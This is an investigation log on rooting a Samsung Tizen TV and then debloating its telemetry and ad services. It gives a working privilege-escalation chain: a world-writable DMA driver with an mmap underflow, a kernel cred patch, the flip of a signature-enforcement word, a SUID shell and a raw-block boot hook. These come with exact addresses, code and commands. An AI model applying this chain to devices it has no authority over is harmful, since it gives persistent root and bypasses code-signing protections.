---
type: investigation
tags: [samsung, tizen, kants2, uep, kernel-exploit, armv7, physical-memory, root]
created: 2026-10-24
last_verified: 2026-10-25
status: current
---

# Root and UEP bypass on Samsung UA43T6500AKXXD (KantS2 / NT72172)

Companion docs: [samsung-tv-dotnet-launcher-standalone-invocation.md](samsung-tv-dotnet-launcher-standalone-invocation.md) (the signed-launcher invocation contract this chain depends on), [samsung-tv-kernel-exploit-and-firmware-options.md](samsung-tv-kernel-exploit-and-firmware-options.md) (earlier route survey, written before root was achieved).

## Summary

A Samsung UA43T6500AKXXD running Tizen 5.5 on a Novatek NT72172 (armv7, kernel
4.1.10, no KASLR) is rooted from an unprivileged `uid=901(sdk)` starting point,
and its **UEP** ("unsigned executable prevention") gate is switched off, so
unsigned native binaries, SUID binaries and shell scripts execute.

Two independent results, both verified on the device:

1. **Arbitrary physical memory R/W** via `/dev/ntkhdma`, which is world
   `rw-rw-rw-`. Escalation to `uid=0` with `CapEff ffffffffffffffff` is a cred
   patch over DRAM.
2. **UEP state word located and flipped**: VA `0xC06236EC` / PA `0x026236EC`,
   `1` = enforce, `0` = disabled. Root alone does *not* lift UEP; this word does.

The expensive part (a 57 s DRAM scan for `struct cred`) turned out to be
unnecessary for ordinary use: with UEP off, a SUID-root binary on the writable
`/opt` partition yields `euid=0` in **151 ms** end to end.

## Target facts

- Model `UA43T6500AKXXD`, firmware tag `20_KANTS2_FHD`, SoC Novatek NT72172,
  Tizen 5.5, armv7 hard-float, kernel `4.1.10`, no KASLR (`PAGE_OFFSET` `0xC0000000`).
- Starting identity: `uid=901(sdk)`, SMACK label `System`,
  `CapEff 0000000000000000`, `CapBnd 0000000300200040`.
- sdb over TCP reachable; `sdb shell` is unreliable (`appcmd_support:disabled`),
  only a retry-wrapped capture path works.
- Writable partitions: `/opt`, `/mnt/systemrw`, `/mnt/drm` are rw vdfs on eMMC and
  survive reboot; `/etc` is read-only; `/tmp`, `/dev/shm`, `/run` are tmpfs.

## Why root is not enough: UEP

After every escalation attempt the failure looked like a permission problem:

```
bash: /opt/hermes/root.sh: Operation not permitted     (EPERM, errno 1)
```

This reproduced for `0755` and `4755` copies, on vdfs and tmpfs, with SMACK label
`_` (correct, same as signed system binaries) and label `System`. Diagnostics that
were all **red herrings**: the SUID bit, the SMACK label, `noexec`/`nosuid` mount
flags, and remount/bind attempts (`MS_BIND` and remount both refused, `rc=-1`).
`/bin/sh` from the kernel's own read-only image executed fine while every file we
created was refused — the decision was signature-based, not mode- or label-based.

Running the script produced the actual reason:

```
[uep][bash] the file is NOT signed!! : /opt/hermes/root.sh
```

UEP is built into the kernel, not a loadable module: `/sys/module/uep` exposes
only `uevent` and `version` (`0.0.1`), no parameters, no `.text`/`.data` sections,
and `/proc/kallsyms` and `/proc/modules` give nothing usable.

## Primitive: `/dev/ntkhdma`

The Novatek HDMA driver is the whole entry point. It is world-writable, and two
bugs compose:

- `GET_BUFF_ADDR = _IOR(90,3,4) = 0x80045A03` returns the DMA buffer's physical
  base (observed `0x93040000`), defeating address randomisation by leaking a
  phys anchor.
- its `mmap` computes `phys = gu32HDMAMemPhysAddr + (vm_pgoff << 12)` but validates
  with `gu32HDMAMemSize - off`, which **underflows** for `off > size`, so any PFN
  can be mapped.

Mapping an arbitrary physical page therefore needs only arithmetic:

```c
off  = (target_phys - leaked_base) & 0xFFFFFFFF;   /* intentional wrap */
offA = off & ~0xFFF;
delta = off - offA;                                 /* in-page offset */
map  = mmap(NULL, len + 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offA);
/* target = (char*)map + delta */
```

Related devices are dead ends: `/dev/ntksys` mmap is compiled out, `/dev/ntkmem`
is ioctl-only (`lseek`/`read`/`mmap` all return `-1`).

DRAM that is safe to touch (from `/proc/cmdline`): `0x02000000-0x3AC00000` and
`0x80000000-0x9C000000`. Flash, eMMC partitions, bootloader, MMIO and
`/dev/eeprom` were never written — every write in this work is one 32-bit word
inside those two DRAM ranges.

## Finding the UEP state word

Public prior art (chris-ritsen/samsung-tv-root `QN90B_REPRODUCTION.md`) says UEP is
a separate execution boundary after `uid 0` and is released by flipping a kernel
state word (their value `phys 0x208c26c4`, volatile). The word is build-specific,
so it has to be located per firmware. Recipe:

1. **Dump kernel memory.** A managed payload (`dotnet-launcher --standalone`)
   streamed 20 MB of physical `0x02000000..` over raw TCP to the control host; a
   managed probe cannot write to tmpfs reliably, and stdout is swallowed by the
   launcher, so TCP is the only dependable channel.
2. **Extract the driver's strings.** They sit in `.rodata` with
   `VA = file offset + 0xC0000000` (phys base `0x02000000`, delta `0xBE000000`):

   | string | VA |
   |---|---|
   | `[%s] Blocked! cur pid:%u, comm:%s, kuep:%c` | `0xC056056C` |
   | `[%s] file %s is not signed. Sign it.` | `0xC0560E54` |
   | `[%s] Verification correct` | `0xC0560E94` |
   | `[%s] UEP has been disabled` | `0xC0561004` |
   | `hash of DUID has been set` | `0xC0561070` |

3. **Find the code that references them.** A literal-pool scan finds nothing, and
   a naive "PC-relative `add`/`ldr`" capstone scan finds nothing either — the ARM
   compiler materialises these addresses with `movw`/`movt` immediate pairs.
   Tracking those two instructions per register and matching the assembled 32-bit
   value lands the driver's code at `0xC01CE800-0xC01CFD00`.
4. **Read the disable path.** The `UEP has been disabled` reference sits at
   `0xC01D3A64`, and a few instructions earlier comes the whole answer:

   ```
   movw ip, #0x36ec
   movt ip, #0xc062        ; ip = 0xC06236EC
   ...
   mov  lr, #0
   str  lr, [ip]           ; *0xC06236EC = 0   <- UEP disabled
   movw r2, #0x1004
   movt r2, #0xc056        ; "[%s] UEP has been disabled"
   bl   printk
   ```

**UEP state word: VA `0xC06236EC`, PA `0x026236EC`. `1` = enforce, `0` = off.
Volatile — a reboot re-arms it.**

## Verification

Causality was proven in both directions in one run, so this is not a coincidence:

```
UEP state word PA 0x026236ec (VA 0xC06236EC) = 0x00000001
wrote 0 -> readback 0x00000000
AFTER flip: /opt/hermes_root -> exit=0 out=[0 | System]     # unsigned binary, uid 0
AFTER flip: /opt/h_plain     -> exit=0                      # unsigned, no SUID
restored 1 -> exit=97 EXECFAIL errno=1                      # EPERM returns
```

Time to flip, measured by a payload that logs over TCP with millisecond stamps:

```
hdmaBase=0x93040000 @96ms
UEP word 1 -> 0 @97ms
suid probe [0 | uid=0(root) |] @151ms
FASTROOT_END total=152ms
```

## Fast path: SUID + UEP off (why the DRAM scan is now only a fallback)

Once UEP is off, a SUID-root shell on `/opt` does the rest, which removes the
57 s DRAM cred scan from the normal path. Verified from a genuine unprivileged
context (`setuid(901)` in a native helper, then exec):

```
uid=901(sdk)                       -> /bin/sh -c id
uid=901(sdk) euid=0(root)          -> /opt/hermes_root -p -c id      (SUID transition works)
```

So a cold boot costs: one signed-launcher invocation to flip the word (~150 ms
plus launcher start), then any command through `/opt/hermes_root -p`. The cred
patch remains worthwhile only when a process needs **full** capability sets
(`CapEff ffffffffffffffff`) rather than the SUID bounding set
(`0000000300200040`), or when the SUID file is unavailable.

Cred patch mechanics, for reference: scan 1 MB chunks for `struct cred` — word 0
`usage` in `(0, 0x1000]` and `uid=euid=suid=fsuid=901`; constrain on uid only
(gid fields may differ, and requiring them misses the process). Zero the eight id
words, set the four `kernel_cap_t` pairs at offsets 40/48/56/64 to `-1`, then
confirm with `getuid()` inline and stop at first success. Full DRAM coverage takes
about 57 s and patched 119-156 cred structures in observed runs.

## The `hr` helper (native, no libc)

`/opt/hermes/hr` is a 2.8 KB statically linked armv7 ELF built on the control host:

```sh
clang -target armv7-linux-gnueabihf -nostdlib -static -O2 -fno-stack-protector \
      -fuse-ld=lld -Wl,-e,_start -o hr hr.c
```

It uses only raw ARM EABI syscalls via `svc #0` (`open`=5, `ioctl`=54, `mmap2`=192,
`setuid`=23, `execve`=11), so it needs no glibc on Tizen. Modes:

- default: disable UEP, then `execve("/opt/hermes_root", {"-p", ...})` → root shell
- `hr -c '<cmd>'`: same, passing the command through to the SUID shell
- `hr -u <uid> <path> [args]`: drop to a plain uid, then exec (used to prove the
  SUID transition without rebooting)
- `hr -a 0|1`: write the UEP word directly (1 re-arms, 0 disables) — a test hook

**Gotcha that cost a cycle:** with `-nostdlib`, a C `_start` cannot read `argc`
from `sp` reliably, because the compiler's prologue pushes registers first. The
entry must be a hand-written asm stub that moves `sp` into `r0` and tail-calls the
C function. Before that fix `hr` silently exec'd `bash -p` with a wrong argv, which
looked like "SUID blocked" but was actually bash waiting on an empty stdin.

## Invocation contract and gotchas

- Launch payloads with the **signed** launcher, from an app dir under
  `/home/owner/share/tmp/...`:

  ```sh
  AUL_APPID=samudntest01.Mali AUL_ROOT_PATH=<appdir> \
    /usr/bin/dotnet-launcher --standalone <appdir>/payload.dll
  ```

- **The launcher will not run a DLL under `/opt`** even with
  `AUL_ROOT_PATH=/opt/hermes` — it exits `0` and the payload never starts (no log,
  no TCP callback). Keep the canonical copy in `/opt/hermes/` (persistent) and
  copy it into the app dir before running.
- Never do a blocking read through `sdb shell` (e.g. `head -c 400000 /dev/kmsg`):
  it wedges `sdbd` until the TV is power-cycled.
- sdb capture is flaky; retry `disconnect()`/`connect()`/`require_device()` with
  4-8 s settles, up to 8 times.
- A TV in standby looks identical to a hang: ping 100 % loss, HTTP `000`, sdb
  unregistered. Wake-on-LAN magic packet to `64:E7:D8:EC:38:EE` (UDP 9/7
  broadcast) recovers it; remote power-**off** is not available.
- The control host firewall must trust the TV's address **permanently**
  (`firewall-cmd --zone=trusted --add-source=192.168.50.31 --permanent`), else the
  TV→host TCP logging dies after every reboot.

## Persistence reality

- `/opt` is eMMC-backed, so payloads in `/opt/hermes/` survive reboot, and the SUID
  bit on `/opt/hermes_root` is honoured (`euid=0` from `uid=901`).
- **UEP re-arms and cred patches vanish on every boot.** After a reboot the chain
  must be re-run: copy the payload into the app dir and invoke the signed launcher
  once (~150 ms of payload work).
- **Solved on 2026-10-25 — see
  [samsung-tv-t6500-persistent-root-boot-hook.md](samsung-tv-t6500-persistent-root-boot-hook.md).**
  The blocker was never "no writable path executed by init" so much as "no writable *file*
  executed by init": the read-only `/` still has a writable **block device**, and
  `tizen-system-env.service` *sources* every `/etc/profile.d/*.sh` as root. Patching the
  vendor `bash_prompt_custom.sh` in place at the raw-block level, at exactly the same byte
  length, gives root ~1 s after every power-on with no host, no sdb and no exploit. The
  route was taken from [`cfloinc/samsung-q70t-tizen-root`](https://github.com/cfloinc/samsung-q70t-tizen-root).

Measured after an actual unplug/replug (2026-10-24, `/proc/uptime` 203 s), layer by layer:
launcher `HIDE_IDS` and the `ConditionPathExists` markers survive because they are files on
`/opt`; `pkgcmd -D` deactivations, `systemctl stop`/`mask --runtime`, the `/etc/hosts`
bind mount and the UEP flip do not. Running services go `104 -> 115` on their own and the
telemetry daemons (`media-analytics`, `contents-recognition`, `vision-data-recognition`,
`voice-app`) come back at boot. Re-apply is two commands and is scripted in
[samsung-tv-t6500-debloat-cold-boot-persistence.md](samsung-tv-t6500-debloat-cold-boot-persistence.md),
which also records why each script must be invoked as data (`hermes_root -p -c
'sh -c "$(cat …)"'`) even while root: UEP re-armed inside the same session during that run.

## Debloat with root

Root's practical value on this set is control of the writable partitions plus
systemd, and a few hard limits that shape what debloat can actually be.

Verified facts:

- **PID 1 is systemd** (`/usr/lib/systemd/systemd`). An earlier note in this repo
  claiming the TV has no systemd is wrong.
- `/` is vdfs **read-only and cannot be remounted** (`mount -o remount,rw /` ->
  `cannot remount ... is write-protected`, rc 32). `/etc/systemd/system` is
  read-only too, so units cannot be added, edited or persistently masked.
  `systemctl stop` and `systemctl mask --runtime` work — the mask symlinks land in
  `/run/systemd/system/* -> /dev/null` — but everything dies at reboot.
- **Bind mounts work** with full caps, which is the way to persist configuration on
  a read-only rootfs: `mount --bind /opt/hermes/hosts.block /etc/hosts`. The source
  file lives on rw `/opt`, so only the mount has to be re-applied per boot.
  `/etc/hosts` itself is **read-only** (`Read-only file system` even as `uid=0` with
  `CapEff ffffffffffffffff`, 148 bytes), so writing the sinkhole entries into it in
  place — the fix floated in the launcher-curation doc — is not available on this build.
  Worth checking whether the sinkhole is even needed: the LAN resolver already returns
  `0.0.0.0` for `samsungads.com` / `samsungacr.com` / `smetrics.samsung.com`.
- `iptables` is present (with Samsung's own `DPM-ALLOW` / `DPM-DENY` chains) but
  there is **no `xt_owner`** module, so rules cannot match a uid — destination
  IP/CIDR only.
- Apps split across partitions: `/usr/apps` (256 entries) is on the read-only
  rootfs and cannot be deleted; `/opt/usr/apps` (164 entries, including
  `adplatform`, `kpi-logging`, `sp-kpi`, `com.samsung.tv.adplayer`,
  `com.samsung.tv.ad-web-framework`) is on rw `/opt` and can be removed or
  quarantined.

### Applied

`/opt/hermes/debloat.sh` stops and runtime-masks the telemetry/ad/update units and
bind-mounts an ad/ACR sinkhole over `/etc/hosts`. Result on the device:

```
== stopping telemetry/ad/update units ==
acr.path=inactive           acr.service=failed
adagent-service.service=failed   kpi-logging.service=inactive
abnormal_user_behavior.service=inactive
emergency-log-transmitter.service=inactive
background-update.service=inactive   background-update.path=inactive
== hosts sinkhole ==
bind-mounted /opt/hermes/hosts.block over /etc/hosts
running services: 110        (was 116)
hosts mount: 1
```

`acr.service` and `adagent-service.service` report `failed` rather than `inactive`
because they exit non-zero when stopped; they are not running. `ac.service`
(application manager) was deliberately left alone. TV remained healthy throughout:
ICMP 0 % loss, `:8001/api/v2/` HTTP 200, and `samsung.com` still resolves normally
while `samsungads.com` / `samsungacr.com` resolve to the sinkhole.

Stopped units: `acr.service`, `acr.path` (automatic content recognition),
`adagent-service.service`, `kpi-logging.service`,
`abnormal_user_behavior.service`, `emergency-log-transmitter.service`,
`background-update.service`, `background-update.path`.

### Package disable + persistent unit markers (v2)

The first attempt renamed seven app directories under `/opt/usr/apps` to
`*.disabled`. That was reverted: it works, but it leaves the package database
believing the app is installed while its files are missing. Tizen has a proper
mechanism, and it also covers apps on the read-only rootfs.

**1. `pkgcmd -D` — deactivate a package for a user.** From `pkgcmd --help`:
`--uid  Specify target user's id. This only affect app activation/deactivation.`
Nothing is uninstalled, no data is cleared, and app directories stay intact:

```sh
pkgcmd -D -t app -n com.samsung.tv.pisa-service --uid 5001
```

Verified functionally — `app_launcher` now refuses the disabled package:

```
app_launcher -s com.samsung.tv.pisa-service
  -> The app with ID: com.samsung.tv.pisa-service is not available for the user 0
```

Thirteen packages deactivated: `adplatform`, `com.samsung.tv.adplayer`,
`com.samsung.tv.ad-web-framework`, `com.samsung.tv.coba.adagent`,
`com.samsung.tv.adagent-service`, `com.samsung.tv.contents-recognition-dbmgr`,
`com.samsung.tv.pisa-service`, `org.tizen.pisa-control-service`,
`com.samsung.tv.canalysis-service`, `com.samsung.tizen.samsung-analytics`,
`mediaanalytics`, `com.samsung.tv.vision-data-recognition-service`,
`org.tizen.acr-service-app`.

**2. `ConditionPathExists` markers — the only genuinely persistent part.**
Two of the most important telemetry daemons gate their own unit files on a path
that lives on writable `/opt`:

```
/usr/lib/systemd/system/pisa-service.service:      ConditionPathExists=!/opt/usr/share/systemd/system/pisa-service
/usr/lib/systemd/system/canalysis-service.service: ConditionPathExists=!/opt/usr/share/systemd/system/canalysis-daemon
```

Because the condition is negated, **creating an empty file there disables the unit
across reboots**:

```sh
mkdir -p /opt/usr/share/systemd/system
: > /opt/usr/share/systemd/system/pisa-service
: > /opt/usr/share/systemd/system/canalysis-daemon
```

Proven by trying to start them anyway — systemd evaluates the condition and refuses:

```
pisa-service.service      is-active=failed  ConditionResult=no
canalysis-service.service is-active=failed  ConditionResult=no
```

**3. Runtime stops/masks** cover the rest (gone at reboot): `acr.path`,
`acr.service`, `adagent-service.service`, `kpi-logging.service`,
`abnormal_user_behavior.service`, `emergency-log-transmitter.service`,
`background-update.service`, `background-update.path`,
`canalysis-service.service`, `contents-recognition-service.service`,
`vision-data-recognition-service.service`, `media-analytics-service.service`,
`org.tizen.tv.sp-kpi.service`, `pisa-service.path`, `pisa-service.service`,
`dlogutil.path`, `dlogutil.timer`.

Result on the device:

```
running services: 116 -> 104
live telemetry processes (canalysis|pisa|adagent|recognition|analytics): 0
ac.service=active   app-context-manager.service=active
ICMP 0% loss   :8001/api/v2/ HTTP 200   "PowerState":"on"
```

### Feature bloat removal (user keep-list: YouTube)

Twenty Samsung feature packages deactivated with `pkgcmd -D` (same mechanism as
above, reversible with `pkgcmd -A`):

- **Samsung TV Plus**: `com.samsung.tv.tvplus`, `tvs-tvplus`
- **Universal Guide promos**: `tvs-guide`, `ug-promotion-tv`
- **Bixby**: `com.samsung.tv.mybixby`, `com.samsung.tv.bixbycapsuleviewer`,
  `com.samsung.tv.bixby-prov`, `com.samsung.tv.bixby-context-client`
- **Voice**: `org.tizen.voice-app`, `org.tizen.voice-client`,
  `com.samsung.tv.ondevice-voice`, `com.samsung.tv.cnvoice`,
  `com.samsung.tv.cnvoice-assistant`,
  `com.samsung.tv.utterance-recommender-service`
- **Third-party assistants**: `com.samsung.tv.alexa-client`,
  `com.samsung.tv.google-assistant`, `org.tizen.multi-assistant-service`
- **SmartThings**: `com.samsung.tizen.smartthings-client`,
  `com.samsung.tizen.smartthings-thing`
- **Internet browser**: `org.tizen.browser`

Deliberately kept: YouTube, Netflix and other installed streaming apps, the app
store, the search app, the Privacy Choices app and the gallery. `com.samsung.tv.vif`
(voice-interaction-framework) was also left alone: it is a framework other UI paths
link against, not a leaky daemon.

Verified after the change:

```
com.samsung.tv.tvplus            -> not available for the user 0
com.samsung.tv.mybixby           -> not available for the user 0
org.tizen.browser                -> not available for the user 0
com.samsung.tizen.smartthings-client -> not available for the user 0
org.tizen.multi-assistant-service    -> not available for the user 0
9Ur5IzDKqV.TizenYouTube          -> successfully launched pid 3686   (kept)
org.tizen.netflix-app            -> successfully launched pid 3474   (kept)
ac.service=active   app-context-manager.service=active
```

**Two Tizen gotchas worth remembering:**

1. **A Tizen app ID is not the package ID.** YouTube is package `9Ur5IzDKqV`, app
   `9Ur5IzDKqV.TizenYouTube`. `pkgcmd` takes `-n <package>`, `app_launcher -s` takes
   the app ID — passing the package to `app_launcher` reports "not available for the
   user 0" even for a perfectly healthy app. Map IDs with
   `pkgcmd -l | grep <id>` before concluding an app is gone.
2. `pkgcmd -k` does not reliably terminate an already-running app instance; the
   process keeps running until it exits. `-D` blocks future activation, which is what
   matters for a reboot.

### Restore

```sh
# re-enable packages
for p in adplatform com.samsung.tv.adplayer com.samsung.tv.ad-web-framework \
         com.samsung.tv.coba.adagent com.samsung.tv.adagent-service \
         com.samsung.tv.contents-recognition-dbmgr com.samsung.tv.pisa-service \
         org.tizen.pisa-control-service com.samsung.tv.canalysis-service \
         com.samsung.tizen.samsung-analytics mediaanalytics \
         com.samsung.tv.vision-data-recognition-service org.tizen.acr-service-app; do
    pkgcmd -A -t app -n "$p" --uid 5001
done
rm -f /opt/usr/share/systemd/system/pisa-service /opt/usr/share/systemd/system/canalysis-daemon
# masks die at reboot; to undo now:
systemctl unmask --runtime <unit> && systemctl start <unit>
```

### Audit notes

- The obfuscated ten-character directory names are **user-installed apps**, not
  bloat: `9Ur5IzDKqV`=YouTube, `rJeHak5zRg`=Spotify, `CmeyUlnhYY`=Amazon Luna,
  `ZmmGjO6VKO`=Sling TV, `30IKH0OX8U`=Aria video/Apple TV component,
  `tv6pbVMQFF`=Privacy Choices. Do not touch them. (`samudntest01` is our own
  sideload from the root work.)
- `/usr/apps` (256 packages, read-only) vs `/opt/usr/apps` (164, writable) is not a
  meaningful split for debloat: `pkgcmd` deactivates either kind.
- Reference material that established this approach:
  `github.com/berteotti/custom-tv` (`docs/3-privacy.md` — the ten-unit list, the
  `ConditionPathExists` markers and the `pkgcmd -D --uid 5001` idiom) and
  `github.com/arlogilbert/tizen-app-id` (package-ID mapping used to identify dirs).
  ACR's purpose is documented by Samsung: viewing-history collection via content
  signatures.

### Running scripts even while UEP is armed

`sh /opt/hermes/debloat.sh`, `sh -s < script.sh` and plain execution all trip UEP —
Tizen's shell hooks script loading, so the file path alone triggers the check. The
content-as-argument form does not, because nothing unsigned is ever executed:

```sh
sh -c "$(cat /opt/hermes/debloat.sh)"
```

This is the reliable way to keep shell tooling on `/opt`. Note also that **UEP
re-armed itself inside a single session** (verified off and executing, then blocking
again ~10 minutes later with no reboot), so UEP-off must never be assumed — re-check
the state word if a native binary suddenly returns EPERM.

### Not possible / deferred

- Persistent unit masking or boot-time application of the debloat: blocked by the
  read-only rootfs and `/etc`.
- Deleting preinstalled apps from `/usr/apps`: read-only partition.
- Per-uid firewall rules: no `xt_owner`.

## Security implication

`/dev/ntkhdma` is `rw-rw-rw-` and its `mmap` accepts arbitrary PFNs. Any local
process on this firmware — a sideloaded app, a compromised app — can gain
arbitrary physical memory R/W and therefore root, without needing a signed
payload. The same applies to `/opt` being a writable, executable partition with no
`nosuid`.

## Files

Control host (`moo@fedora`):

- `~/tv-src/hr.c`, `~/tv-src/hr` — freestanding ARM helper
- `~/tv-src/fast-root/` — payload that flips UEP then validates the SUID path
- `~/tv-src/kdump/` — kernel dump client; receiver `~/kdump_srv.py` (port 4559)
- `~/uep_scan2.py` — movw/movt scanner that located the driver code
- `~/kerneldump.bin` — 20 MB kernel dump (VA = offset + `0xC0000000`)

On the TV:

- `/opt/hermes/esc.dll` + `esc.runtimeconfig.json` + `esc.deps.json` — fast payload
- `/opt/hermes/hr` — native helper
- `/opt/hermes_root` — SUID copy of `/bin/sh` (mode `4755`, label `_`)

## Next step — DONE (2026-10-25)

Boot-time persistence is in place and verified on a real cold boot: a same-size raw-block
patch of `/etc/profile.d/bash_prompt_custom.sh` on `/dev/mmcblk0p18` (512-block 1023384)
makes `tizen-system-env.service` run `/opt/hermes/boot.sh` as `uid=0` at uptime 1 s, which
re-applies the whole debloat and can run anything else as root. `/opt/hermes/rollback.sh`
restores the vendor bytes. Full write-up, hashes, the boot log and the remaining gotchas:
[samsung-tv-t6500-persistent-root-boot-hook.md](samsung-tv-t6500-persistent-root-boot-hook.md).

The `~150 ms` FastRoot invocation is now only needed for **interactive** root (the boot hook
already ran as root; the sdb injection still lands as `uid=901`).
